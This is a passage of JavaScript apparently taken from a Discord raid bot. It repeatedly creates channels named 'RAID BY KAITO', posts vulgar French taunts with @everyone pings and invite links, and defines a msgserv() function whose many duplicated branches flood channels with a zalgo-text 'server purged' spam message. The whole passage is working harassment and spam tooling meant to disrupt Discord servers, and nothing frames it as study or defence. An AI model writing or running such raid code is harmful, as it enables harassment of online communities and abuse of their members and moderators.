          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))
  
  
        }
  
      }
  
  })
  
  
  function msgserv(chnl, mode){
  
    if(chnl.type !== 'text') return;
  
    if(mode === 'p'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')
  
    }else if(mode === 's'){
  
      chnl.send("**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-")
  
    }else if(mode === 'n'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'n'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'b'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'o'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'i'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'y'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'z'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'u'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'i'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'y'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'z'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'u'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'i'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'y'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'z'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'u'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'i'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'y'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'z'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'u'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'i'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'y'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'z'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'u'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'i'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'y'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'z'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'u'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'i'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'y'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'z'){
  
      chnl.send('**C̗̠̭͈e͈͔͔͓̻̐͑ͦ͛̿͛ͅ sͭ͑̂̍e̱͈̿ͮr̞̮͉̞̤̗̽ͤ̍̅̔ͤv̖̫̺̼̞̗͍er̙̦ ̞̪̘̆͋͌è̥st͙̦̮̪̿̒ͨͫ ̼͖͈̌̃́ḏ̜̘̙̣͇ẹ́s̹̤̮̞o͐̾̀ͯ͊ͧ̆r̰͓m͌̒ͣ͐ͤͫaị͖̪̊ͩ̊s ̂̽̆͛͛̓͛pu̺͍̩̓̋̚r̥̰̲̟̝͓̐̎̑̓ͭ͒gé̉́͒ͯ̔̎̚ !͔͕̑̅** **Hop Hop Hop rejoinds le serveur !** --> https://discord.gg/9PqBYQB <-- -||@everyone||-')

    }else if(mode === 'u'){
  
